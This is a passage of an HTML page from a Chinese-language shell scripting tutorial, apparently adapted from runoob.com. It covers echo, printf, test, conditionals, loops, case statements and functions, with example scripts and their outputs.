class="line">then</span><br><span class="line">   echo &quot;文件是个目录&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件不是个目录&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -s $file ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;文件不为空&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件为空&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -e $file ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;文件存在&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件不存在&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件可读</span><br><span class="line">文件可写</span><br><span class="line">文件可执行</span><br><span class="line">文件为普通文件</span><br><span class="line">文件不是个目录</span><br><span class="line">文件不为空</span><br><span class="line">文件存在</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-echo命令"><a href="#Shell-echo命令" class="headerlink" title="Shell echo命令"></a>Shell echo命令</h2><p>Shell 的 echo 指令与 PHP 的 echo 指令类似，都是用于字符串的输出。命令格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo string</span><br></pre></td></tr></table></figure></p>
<p>您可以使用echo实现更复杂的输出格式控制。</p>
<h2 id="1-显示普通字符串"><a href="#1-显示普通字符串" class="headerlink" title="1.显示普通字符串:"></a>1.显示普通字符串:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;It is a test&quot;</span><br></pre></td></tr></table></figure>
<p>这里的双引号完全可以省略，以下命令与上面实例效果一致：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo It is a test</span><br></pre></td></tr></table></figure></p>
<h2 id="2-显示转义字符"><a href="#2-显示转义字符" class="headerlink" title="2.显示转义字符"></a>2.显示转义字符</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;\&quot;It is a test\&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>结果将是:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;It is a test&quot;</span><br></pre></td></tr></table></figure></p>
<p>同样，双引号也可以省略</p>
<h2 id="3-显示变量"><a href="#3-显示变量" class="headerlink" title="3.显示变量"></a>3.显示变量</h2><p>read 命令从标准输入中读取一行,并把输入行的每个字段的值指定给 shell 变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">read name </span><br><span class="line">echo &quot;$name It is a test&quot;</span><br></pre></td></tr></table></figure>
<p>以上代码保存为 test.sh，name 接收标准输入的变量，结果将是:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# sh test.sh</span><br><span class="line">OK                     #标准输入</span><br><span class="line">OK It is a test        #输出</span><br></pre></td></tr></table></figure></p>
<h2 id="4-显示换行"><a href="#4-显示换行" class="headerlink" title="4.显示换行"></a>4.显示换行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;OK! \n&quot; # -e 开启转义</span><br><span class="line">echo &quot;It is a test&quot;</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OK!</span><br><span class="line"></span><br><span class="line">It is a test</span><br></pre></td></tr></table></figure></p>
<h2 id="5-显示不换行"><a href="#5-显示不换行" class="headerlink" title="5.显示不换行"></a>5.显示不换行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo -e &quot;OK! \c&quot; # -e 开启转义 \c 不换行</span><br><span class="line">echo &quot;It is a test&quot;</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OK! It is a test</span><br></pre></td></tr></table></figure></p>
<p>6.显示结果定向至文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;It is a test&quot; &gt; myfile</span><br></pre></td></tr></table></figure></p>
<p>7.原样输出字符串，不进行转义或取变量(用单引号)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &apos;$name\&quot;&apos;</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name\&quot;</span><br></pre></td></tr></table></figure></p>
<p>8.显示命令执行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo `date`</span><br></pre></td></tr></table></figure></p>
<p>注意： 这里使用的是反引号 `, 而不是单引号 ‘。</p>
<p>结果将显示当前日期<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thu Jul 24 10:08:46 CST 2014</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-printf-命令"><a href="#Shell-printf-命令" class="headerlink" title="Shell printf 命令"></a>Shell printf 命令</h2><p>上一章节我们学习了 Shell 的 echo 命令，本章节我们来学习 Shell 的另一个输出命令 printf。</p>
<p>printf 命令模仿 C 程序库（library）里的 printf() 程序。</p>
<p>printf 由 POSIX 标准所定义，因此使用 printf 的脚本比使用 echo 移植性好。</p>
<p>printf 使用引用文本或空格分隔的参数，外面可以在 printf 中使用格式化字符串，还可以制定字符串的宽度、左右对齐方式等。默认 printf 不会像 echo 自动添加换行符，我们可以手动添加 \n。</p>
<p>printf 命令的语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf  format-string  [arguments...]</span><br></pre></td></tr></table></figure></p>
<p>参数说明：</p>
<p>format-string: 为格式控制字符串<br>arguments: 为参数列表。</p>
<p>实例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo &quot;Hello, Shell&quot;</span><br><span class="line">Hello, Shell</span><br><span class="line">$ printf &quot;Hello, Shell\n&quot;</span><br><span class="line">Hello, Shell</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<p>接下来,我来用一个脚本来体现printf的强大功能：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"> </span><br><span class="line">printf &quot;%-10s %-8s %-4s\n&quot; 姓名 性别 体重kg  </span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 郭靖 男 66.1234 </span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 杨过 男 48.6543 </span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 郭芙 女 47.9876</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">姓名     性别   体重kg</span><br><span class="line">郭靖     男      66.12</span><br><span class="line">杨过     男      48.65</span><br><span class="line">郭芙     女      47.99</span><br></pre></td></tr></table></figure></p>
<p>%s %c %d %f都是格式替代符</p>
<p>%-10s 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。</p>
<p>%-4.2f 指格式化为小数，其中.2指保留2位小数。</p>
<p>更多实例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"> </span><br><span class="line"># format-string为双引号</span><br><span class="line">printf &quot;%d %s\n&quot; 1 &quot;abc&quot;</span><br><span class="line"></span><br><span class="line"># 单引号与双引号效果一样 </span><br><span class="line">printf &apos;%d %s\n&apos; 1 &quot;abc&quot; </span><br><span class="line"></span><br><span class="line"># 没有引号也可以输出</span><br><span class="line">printf %s abcdef</span><br><span class="line"></span><br><span class="line"># 格式只指定了一个参数，但多出的参数仍然会按照该格式输出，format-string 被重用</span><br><span class="line">printf %s abc def</span><br><span class="line"></span><br><span class="line">printf &quot;%s\n&quot; abc def</span><br><span class="line"></span><br><span class="line">printf &quot;%s %s %s\n&quot; a b c d e f g h i j</span><br><span class="line"></span><br><span class="line"># 如果没有 arguments，那么 %s 用NULL代替，%d 用 0 代替</span><br><span class="line">printf &quot;%s and %d \n&quot;</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 abc</span><br><span class="line">1 abc</span><br><span class="line">abcdefabcdefabc</span><br><span class="line">def</span><br><span class="line">a b c</span><br><span class="line">d e f</span><br><span class="line">g h i</span><br><span class="line">j  </span><br><span class="line"> and 0</span><br></pre></td></tr></table></figure></p>
<h2 id="printf的转义序列"><a href="#printf的转义序列" class="headerlink" title="printf的转义序列"></a>printf的转义序列</h2><p><img src="https://mfaying.github.io/static/images/shell/8.jpg" alt="avatar"></p>
<h2 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ printf &quot;a string, no processing:&lt;%s&gt;\n&quot; &quot;A\nB&quot;</span><br><span class="line">a string, no processing:&lt;A\nB&gt;</span><br><span class="line"></span><br><span class="line">$ printf &quot;a string, no processing:&lt;%b&gt;\n&quot; &quot;A\nB&quot;</span><br><span class="line">a string, no processing:&lt;A</span><br><span class="line">B&gt;</span><br><span class="line"></span><br><span class="line">$ printf &quot;www.runoob.com \a&quot;</span><br><span class="line">www.runoob.com $                  #不换行</span><br></pre></td></tr></table></figure>
<h2 id="Shell-test-命令"><a href="#Shell-test-命令" class="headerlink" title="Shell test 命令"></a>Shell test 命令</h2><p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p>
<h2 id="数值测试"><a href="#数值测试" class="headerlink" title="数值测试"></a>数值测试</h2><p><img src="https://mfaying.github.io/static/images/shell/9.jpg" alt="avatar"><br>实例演示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num1=100</span><br><span class="line">num2=100</span><br><span class="line">if test $[num1] -eq $[num2]</span><br><span class="line">then</span><br><span class="line">    echo &apos;两个数相等！&apos;</span><br><span class="line">else</span><br><span class="line">    echo &apos;两个数不相等！&apos;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两个数相等！</span><br></pre></td></tr></table></figure></p>
<p>代码中的 [] 执行基本的算数运算，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">a=5</span><br><span class="line">b=6</span><br><span class="line"></span><br><span class="line">result=$[a+b] # 注意等号两边不能有空格</span><br><span class="line">echo &quot;result 为： $result&quot;</span><br></pre></td></tr></table></figure></p>
<p>结果为:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">result 为： 11</span><br></pre></td></tr></table></figure></p>
<h2 id="字符串测试"><a href="#字符串测试" class="headerlink" title="字符串测试"></a>字符串测试</h2><p><img src="https://mfaying.github.io/static/images/shell/10.jpg" alt="avatar"><br>实例演示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num1=&quot;ru1noob&quot;</span><br><span class="line">num2=&quot;runoob&quot;</span><br><span class="line">if test $num1 = $num2</span><br><span class="line">then</span><br><span class="line">    echo &apos;两个字符串相等!&apos;</span><br><span class="line">else</span><br><span class="line">    echo &apos;两个字符串不相等!&apos;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两个字符串不相等!</span><br></pre></td></tr></table></figure></p>
<h2 id="文件测试"><a href="#文件测试" class="headerlink" title="文件测试"></a>文件测试</h2><p><img src="https://mfaying.github.io/static/images/shell/11.jpg" alt="avatar"><br>实例演示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /bin</span><br><span class="line">if test -e ./bash</span><br><span class="line">then</span><br><span class="line">    echo &apos;文件已存在!&apos;</span><br><span class="line">else</span><br><span class="line">    echo &apos;文件不存在!&apos;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件已存在!</span><br></pre></td></tr></table></figure></p>
<p>另外，Shell还提供了与( -a )、或( -o )、非( ! )三个逻辑操作符用于将测试条件连接起来，其优先级为：”!”最高，”-a”次之，”-o”最低。例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /bin</span><br><span class="line">if test -e ./notFile -o -e ./bash</span><br><span class="line">then</span><br><span class="line">    echo &apos;至少有一个文件存在!&apos;</span><br><span class="line">else</span><br><span class="line">    echo &apos;两个文件都不存在&apos;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">至少有一个文件存在!</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-流程控制"><a href="#Shell-流程控制" class="headerlink" title="Shell 流程控制"></a>Shell 流程控制</h2><p>和Java、PHP等语言不一样，sh的流程控制不可为空，如(以下为PHP流程控制写法)：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;q&quot;])) &#123;</span><br><span class="line">    search(q);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    // 不做任何事情</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在sh/bash里可不能这么写，如果else分支没有语句执行，就不要写这个else。</p>
<h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><p>if<br>if 语句语法格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>写成一行（适用于终端命令提示符）：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [ $(ps -ef | grep -c &quot;ssh&quot;) -gt 1 ]; then echo &quot;true&quot;; fi</span><br></pre></td></tr></table></figure></p>
<p>末尾的fi就是if倒过来拼写，后面还会遇到类似的。</p>
<h2 id="if-else-1"><a href="#if-else-1" class="headerlink" title="if else"></a>if else</h2><p>if else 语法格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">else</span><br><span class="line">    command</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<h2 id="if-else-if-else"><a href="#if-else-if-else" class="headerlink" title="if else-if else"></a>if else-if else</h2><p>if else-if else 语法格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if condition1</span><br><span class="line">then</span><br><span class="line">    command1</span><br><span class="line">elif condition2 </span><br><span class="line">then </span><br><span class="line">    command2</span><br><span class="line">else</span><br><span class="line">    commandN</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>以下实例判断两个变量是否相等：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line">if [ $a == $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 等于 b&quot;</span><br><span class="line">elif [ $a -gt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 大于 b&quot;</span><br><span class="line">elif [ $a -lt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;没有符合的条件&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a 小于 b</span><br></pre></td></tr></table></figure></p>
<p>if else语句经常与test命令结合使用，如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num1=$[2*3]</span><br><span class="line">num2=$[1+5]</span><br><span class="line">if test $[num1] -eq $[num2]</span><br><span class="line">then</span><br><span class="line">    echo &apos;两个数字相等!&apos;</span><br><span class="line">else</span><br><span class="line">    echo &apos;两个数字不相等!&apos;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两个数字相等!</span><br></pre></td></tr></table></figure></p>
<h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><p>与其他编程语言类似，Shell支持for循环。</p>
<p>for循环一般格式为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for var in item1 item2 ... itemN</span><br><span class="line">do</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>写成一行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for var in item1 item2 ... itemN; do command1; command2… done;</span><br></pre></td></tr></table></figure></p>
<p>当变量值在列表里，for循环即执行一次所有命令，使用变量名获取列表中的当前取值。命令可为任何有效的shell命令和语句。in列表可以包含替换、字符串和文件名。</p>
<p>in列表是可选的，如果不用它，for循环使用命令行的位置参数。</p>
<p>例如，顺序输出当前列表中的数字：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for loop in 1 2 3 4 5</span><br><span class="line">do</span><br><span class="line">    echo &quot;The value is: $loop&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The value is: 1</span><br><span class="line">The value is: 2</span><br><span class="line">The value is: 3</span><br><span class="line">The value is: 4</span><br><span class="line">The value is: 5</span><br></pre></td></tr></table></figure></p>
<p>顺序输出字符串中的字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for str in &apos;This is a string&apos;</span><br><span class="line">do</span><br><span class="line">    echo $str</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This is a string</span><br></pre></td></tr></table></figure></p>
<h2 id="while-语句"><a href="#while-语句" class="headerlink" title="while 语句"></a>while 语句</h2><p>while循环用于不断执行一系列命令，也用于从输入文件中读取数据；命令通常为测试条件。其格式为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>以下是一个基本的while循环，测试条件是：如果int小于等于5，那么条件返回真。int从0开始，每次循环处理时，int加1。运行上述脚本，返回数字1到5，然后终止。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">int=1</span><br><span class="line">while(( $int&lt;=5 ))</span><br><span class="line">do</span><br><span class="line">    echo $int</span><br><span class="line">    let &quot;int++&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>运行脚本，输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure></p>
<p>使用中使用了 Bash let 命令，它用于执行一个或多个表达式，变量计算中不需要加上 $ 来表示变量，具体可查阅：Bash let 命令</p>
<p>。<br>while循环可用于读取键盘信息。下面的例子中，输入信息被设置为变量FILM，按<ctrl-d>结束循环。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &apos;按下 &lt;CTRL-D&gt; 退出&apos;</span><br><span class="line">echo -n &apos;输入你最喜欢的网站名: &apos;</span><br><span class="line">while read FILM</span><br><span class="line">do</span><br><span class="line">    echo &quot;是的！$FILM 是一个好网站&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></ctrl-d></p>
<p>运行脚本，输出类似下面：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按下 &lt;CTRL-D&gt; 退出</span><br><span class="line">输入你最喜欢的网站名:菜鸟教程</span><br><span class="line">是的！菜鸟教程 是一个好网站</span><br></pre></td></tr></table></figure></p>
<h2 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h2><p>无限循环语法格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for (( ; ; ))</span><br></pre></td></tr></table></figure></p>
<h2 id="until-循环"><a href="#until-循环" class="headerlink" title="until 循环"></a>until 循环</h2><p>until 循环执行一系列命令直至条件为 true 时停止。</p>
<p>until 循环与 while 循环在处理方式上刚好相反。</p>
<p>一般 while 循环优于 until 循环，但在某些时候—也只是极少数情况下，until 循环更加有用。</p>
<p>until 语法格式:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">until condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>condition 一般为条件表达式，如果返回值为 false，则继续执行循环体内的语句，否则跳出循环。</p>
<p>以下实例我们使用 until 命令来输出 0 ~ 9 的数字：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">a=0</span><br><span class="line"></span><br><span class="line">until [ ! $a -lt 10 ]</span><br><span class="line">do</span><br><span class="line">   echo $a</span><br><span class="line">   a=`expr $a + 1`</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p>输出结果为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure></p>
<h2 id="case"><a href="#case" class="headerlink" title="case"></a>case</h2><p>Shell case语句为多选择语句。可以用case语句匹配一个值与一个模式，如果匹配成功，执行相匹配的命令。case语句格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case 值 in</span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></p>
<p>case工作方式如上所示。取值后面必须为单词in，每一模式必须以右括号结束。取值可以为变量或常数。匹配发现取值符合某一模式后，其间所有命令开始执行直至 ;;。</p>
<p>取值将检测匹配的每一个模式。一旦模式匹配，则执行完匹配模式相应命令后不再继续其他模式。如果无一匹配模式，使用星号 * 捕获该值，再执行后面的命令。</p>
<p>下面的脚本提示输入1到4，与每一种模式进行匹配：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &apos;输入 1 到 4 之间的数字:&apos;</span><br><span class="line">echo &apos;你输入的数字为:&apos;</span><br><span class="line">read aNum</span><br><span class="line">case $aNum in</span><br><span class="line">    1)  echo &apos;你选择了 1&apos;</span><br><span class="line">    ;;</span><br><span class="line">    2)  echo &apos;你选择了 2&apos;</span><br><span class="line">    ;;</span><br><span class="line">    3)  echo &apos;你选择了 3&apos;</span><br><span class="line">    ;;</span><br><span class="line">    4)  echo &apos;你选择了 4&apos;</span><br><span class="line">    ;;</span><br><span class="line">    *)  echo &apos;你没有输入 1 到 4 之间的数字&apos;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></p>
<p>输入不同的内容，会有不同的结果，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入 1 到 4 之间的数字:</span><br><span class="line">你输入的数字为:</span><br><span class="line">3</span><br><span class="line">你选择了 3</span><br></pre></td></tr></table></figure></p>
<h2 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h2><p>在循环过程中，有时候需要在未达到循环结束条件时强制跳出循环，Shell使用两个命令来实现该功能：break和continue。</p>
<h2 id="break命令"><a href="#break命令" class="headerlink" title="break命令"></a>break命令</h2><p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p>
<p>下面的例子中，脚本进入死循环直至用户输入数字大于5。要跳出这个循环，返回到shell提示符下，需要使用break命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo -n &quot;输入 1 到 5 之间的数字:&quot;</span><br><span class="line">    read aNum</span><br><span class="line">    case $aNum in</span><br><span class="line">        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *) echo &quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span><br><span class="line">            break</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>执行以上代码，输出结果为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入 1 到 5 之间的数字:3</span><br><span class="line">你输入的数字为 3!</span><br><span class="line">输入 1 到 5 之间的数字:7</span><br><span class="line">你输入的数字不是 1 到 5 之间的! 游戏结束</span><br></pre></td></tr></table></figure></p>
<p>continue<br>continue命令与break命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环。</p>
<p>对上面的例子进行修改：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo -n &quot;输入 1 到 5 之间的数字: &quot;</span><br><span class="line">    read aNum</span><br><span class="line">    case $aNum in</span><br><span class="line">        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *) echo &quot;你输入的数字不是 1 到 5 之间的!&quot;</span><br><span class="line">            continue</span><br><span class="line">            echo &quot;游戏结束&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>运行代码发现，当输入大于5的数字时，该例中的循环不会结束，语句 echo “游戏结束” 永远不会被执行。</p>
<h2 id="esac"><a href="#esac" class="headerlink" title="esac"></a>esac</h2><p>case的语法和C family语言差别很大，它需要一个esac（就是case反过来）作为结束标记，每个case分支用右圆括号，用两个分号表示break。</p>
<h2 id="Shell-函数"><a href="#Shell-函数" class="headerlink" title="Shell 函数"></a>Shell 函数</h2><p>linux shell 可以用户定义函数，然后在shell脚本中可以随便调用。</p>
<p>shell中函数的定义格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ function ] funname [()]</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    action;</span><br><span class="line"></span><br><span class="line">    [return int;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>说明：<br>1、可以带function fun() 定义，也可以直接fun() 定义,不带任何参数。<br>2、参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255<br>下面的例子定义了一个函数并进行调用：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">demoFun()&#123;</span><br><span class="line">    echo &quot;这是我的第一个 shell 函数!&quot;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;-----函数开始执行-----&quot;</span><br><span class="line">demoFun</span><br><span class="line">echo &quot;-----函数执行完毕-----&quot;</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----函数开始执行-----</span><br><span class="line">这是我的第一个 shell 函数!</span><br><span class="line">-----函数执行完毕-----</span><br></pre></td></tr></table></figure></p>
<p>下面定义一个带有return语句的函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">funWithReturn()&#123;</span><br><span class="line">    echo &quot;这个函数会对输入的两个数字进行相加运算...&quot;</span><br><span class="line">    echo &quot;输入第一个数字: &quot;</span><br><span class="line">    read aNum</span><br><span class="line">    echo &quot;输入第二个数字: &quot;</span><br><span class="line">    read anotherNum</span><br><span class="line">    echo &quot;两个数字分别为 $aNum 和 $anotherNum !&quot;</span><br><span class="line">    return $(($aNum+$anotherNum))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line">echo &quot;输入的两个数字之和为 $? !&quot;</span><br></pre></td></tr></table></figure></p>
<p>输出类似下面：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个函数会对输入的两个数字进行相加运算...</span><br><span class="line">输入第一个数字: </span><br><span class="line">1</span><br><span class="line">输入第二个数字: </span><br><span class="line">2</span><br><span class="line">两个数字分别为 1 和 2 !</span><br><span class="line">输入的两个数字之和为 3 !</span><br></pre></td></tr></table></figure></p>
<p>函数返回值在调用该函数后通过 $? 来获得。</p>
<p>注意：所有函数在使用前必须定义。这意味着必须将函数放在脚本开始部分，直至shell解释器首次发现它时，才可以使用。调用函数仅使用其函数名即可。</p>
